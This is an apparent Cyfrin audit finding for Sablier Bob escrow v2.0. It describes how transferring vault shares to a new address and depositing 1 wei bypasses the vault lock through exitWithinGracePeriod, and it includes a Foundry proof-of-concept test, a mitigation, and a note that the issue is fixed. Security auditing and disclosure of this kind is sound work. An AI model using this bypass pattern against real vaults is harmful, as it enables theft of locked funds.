---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-25-cyfrin-sablier-bob-escrow-v2-0-2-0
ingested_at: '2026-08-16T05:02:10Z'
protocol_category: []
published_at: '2026-03-25T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-25-cyfrin-sablier-bob-escrow-v2-0
title: Users can bypass vault lock and withdraw at any time
vuln_class: []
---

# Users can bypass vault lock and withdraw at any time

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md)_

---

**Description:** A user can bypass the vault lock to withdraw at any time by:
- Transferring their `BobVaultShare` to a different address
- Calling `SablierBob::enter` from the new address with a small amount of additional tokens
- Calling `SablierBob::exitWithinGracePeriod` from the new address to withdraw the total balance including the originally locked deposit

This works because `exitWithinGracePeriod` (`SablierBob.sol:237-287`) only checks that the caller has a `_firstDepositTimes` entry and is within the grace period. It burns the caller's entire share balance (line 248), not just the amount they deposited:

```solidity
uint128 amount = vault.shareToken.balanceOf(msg.sender).toUint128();
```

When the new address calls `enter` with even 1 wei, it gets a fresh `_firstDepositTimes` entry (line 213-215). Combined with the transferred shares, `exitWithinGracePeriod` then burns and returns everything.

**Impact:** The vault's purpose is to lock tokens until a price target is reached or the expiry passes. This bypass completely defeats the lock mechanism — any user can withdraw at any time while the vault is still ACTIVE, at the cost of 1 additional token. This undermines the core value proposition of the protocol.

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/exit-within-grace-period/exitWithinGracePeriodPoC.t.sol`:

```solidity
/// A user can bypass the vault lock by:
/// 1. Transferring BobVaultShare to a different address
/// 2. Calling enter from the new address with a small amount
/// 3. Calling exitWithinGracePeriod to withdraw everything including the locked deposit
function test_PoC_BypassVaultLock() external {
    uint256 vaultId = createDefaultVault();
    uint128 depositAmount = DEPOSIT_AMOUNT; // 10_000e18

    // User A deposits into the vault
    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    assertEq(shareToken.balanceOf(users.depositor), depositAmount, "A has shares");

    // Grace period expires - user A should be locked in
    vm.warp(block.timestamp + 4 hours + 1);

    // Verify A can no longer exit via grace period
    uint40 depositedAt = bob.getFirstDepositTime(vaultId, users.depositor);
    uint40 gracePeriodEnd = depositedAt + 4 hours;
    vm.expectRevert(
        abi.encodeWithSelector(
            Errors.SablierBob_GracePeriodExpired.selector, vaultId, users.depositor, depositedAt, gracePeriodEnd
        )
    );
    bob.exitWithinGracePeriod(vaultId);

    // A transfers all shares to address B (same person, different address)
    shareToken.transfer(users.depositor2, depositAmount);
    assertEq(shareToken.balanceOf(users.depositor), 0, "A transferred all shares");
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount, "B received shares");

    // B deposits 1 wei to get a fresh _firstDepositTimes entry
    setMsgSender(users.depositor2);
    bob.enter(vaultId, 1);

    // B now has all shares + 1 and a fresh grace period
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount + 1, "B has all shares + 1");

    // B exits within grace period - withdraws EVERYTHING including A's locked deposit
    uint256 tokenBalanceBefore = dai.balanceOf(users.depositor2);
    bob.exitWithinGracePeriod(vaultId);
    uint256 tokensReceived = dai.balanceOf(users.depositor2) - tokenBalanceBefore;

    // B received the full amount: the originally locked deposit + 1 wei
    assertEq(tokensReceived, depositAmount + 1, "EXPLOIT: withdrew all tokens including locked deposit");
    assertEq(shareToken.balanceOf(users.depositor2), 0, "B has no shares left");
}
```

Run with: `forge test --match-test test_PoC_BypassVaultLock -vvv`

**Recommended Mitigation:** Track the original deposit amount per user and only allow exiting with up to that amount during the grace period:
```solidity
mapping(uint256 vaultId => mapping(address user => uint128 depositedAmount)) internal _userDeposits;
```

In `exitWithinGracePeriod`, use `min(shareBalance, _userDeposits[vaultId][msg.sender])` instead of the full share balance.

**Sablier:** Fixed in commit [74fa619](https://github.com/sablier-labs/lockup/commit/74fa619471e00958b6b922f8b6c4d9bb95ccc37a) by removing the early exit grace period functionality.

**Cyfrin:** Verified.
